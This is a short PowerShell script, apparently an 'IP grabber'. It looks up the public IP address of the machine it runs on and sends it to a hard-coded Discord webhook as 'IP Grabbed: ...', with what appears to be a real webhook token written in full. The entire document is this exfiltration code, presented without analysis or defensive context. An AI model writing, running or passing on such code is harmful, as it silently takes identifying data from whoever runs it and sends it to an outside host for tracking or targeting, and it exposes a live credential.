$publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org")
$webhookUrl = "https://discord.com/api/webhooks/1393282038219669607/aaxKUcoisulTy_UD7dW7kuCWkMlYtdED4xPDQ2w0tnrbykYOA0u5TfjzoAjASnuNxUQz"

$body = @{
    content = "IP Grabbed: $publicIP"
} | ConvertTo-Json

Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
